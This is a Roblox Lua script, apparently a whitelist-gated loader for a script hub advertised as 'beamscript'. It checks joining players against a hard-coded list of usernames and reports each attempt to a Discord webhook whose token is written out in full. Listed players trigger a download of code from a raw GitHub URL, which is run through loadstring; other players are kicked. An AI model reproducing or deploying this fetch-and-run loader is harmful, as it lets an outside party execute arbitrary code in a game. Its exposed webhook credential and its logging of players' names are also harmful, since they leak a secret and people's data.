local HttpService = game:GetService("HttpService")
local WebhookURL = "https://discord.com/api/webhooks/1272319295384326146/pJzo_clgYEzuX5Eq1bGUdMzntzM8D7I5Lt_DVugzluBmeV71V1zWelSwndzPdHlusAez"

-- Whitelisted usernames
local WhitelistedUsers = {
    ["antikupper"] = true, ["0x3919"] = true, ["YPK_JJx"] = true, ["Drachen_party1234a"] = true, ["freedllm"] = true,
    ["galaxy_littlebro"] = true, ["blade_verified"] = true, ["thecoolkidhehehehe1"] = true, ["lxnzzzz"] = true,
    ["coolboygem99"] = true, ["Soulz_jxsh"] = true, ["fatahhstackz"] = true, ["bosip29"] = true
}

-- Function to notify on Discord
local function NotifyDiscord(username, status)
    local message = {
        ["content"] = username .. " attempted to run the script. Status: " .. status
    }
    local jsonMessage = HttpService:JSONEncode(message)
    pcall(function()
        HttpService:PostAsync(WebhookURL, jsonMessage, Enum.HttpContentType.ApplicationJson)
    end)
end

-- Function to check if the player is whitelisted
local function IsWhitelisted(username)
    return WhitelistedUsers[username] or false
end

-- Rate limit control
local lastActionTime = {}
local rateLimit = 10

-- Event that triggers when a player joins
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        local username = player.Name
        local currentTime = tick()

        -- Check rate limit
        if lastActionTime[username] and (currentTime - lastActionTime[username] < rateLimit) then
            return
        end

        lastActionTime[username] = currentTime

        if IsWhitelisted(username) then
            -- Player is whitelisted, notify success
            NotifyDiscord(username, "Whitelisted - Access Granted")

            -- Execute the external script securely
            pcall(function()
                local scriptUrl = "https://raw.githubusercontent.com/rijadha22/bruh/main/nun"
                local scriptContent = HttpService:GetAsync(scriptUrl)
                loadstring(scriptContent)()
            end)

        else
            -- Player is not whitelisted, notify failure
            NotifyDiscord(username, "Not Whitelisted - Access Denied")

            -- Optionally kick the player if not whitelisted
            player:Kick("Not Whitelisted. Get Whitelisted At discord.gg/beamscript.")
        end
    end)
end)
